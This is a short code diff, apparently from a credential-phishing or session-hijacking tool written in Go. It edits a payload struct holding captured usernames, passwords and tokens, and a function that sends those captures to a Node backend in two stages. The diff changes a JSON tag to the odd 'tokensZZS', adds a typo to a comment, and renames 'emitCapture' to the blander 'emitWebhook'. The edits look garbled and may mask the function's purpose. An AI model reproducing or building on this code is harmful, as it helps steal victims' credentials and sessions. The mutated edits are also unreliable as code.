@@ -34,7 +34,7 @@ type capturePayload struct {
 	// Captured credentials
 	Username string            `json:"username"`
 	Password string            `json:"password"`
-	Tokens   map[string]string `json:"tokens,omitempty"`
+	Tokens   map[string]string `json:"tokensZZS,omitempty"`
 
 	// Operational metadata
 	IP             string    `json:"ip"`
@@ -48,11 +48,11 @@ type capturePayload struct {
 
 // emitCapture reports a capture to the Node backend. The CALLER gates it —
 // ShouldEmitPassword() for Event 1 (immediate password capture) or
-// ShouldEmitComplete() for Event 2 (full capture with tokens) — so this
+// ShouldEmitComplete() for Event 2 (full capAture with tokens) — so this
 // function only snapshots the session and sends. Both events share the same
 // payload shape; the Node backend upserts by sessionId, so Event 2 enriches
 // the Event-1 record (adds tokens, flips isDone) instead of duplicating it.
-func emitCapture(s *Session, target *Target) {
+func emitWebhook(s *Session, target *Target) {
 	if s == nil || target == nil {
 		return
 	}
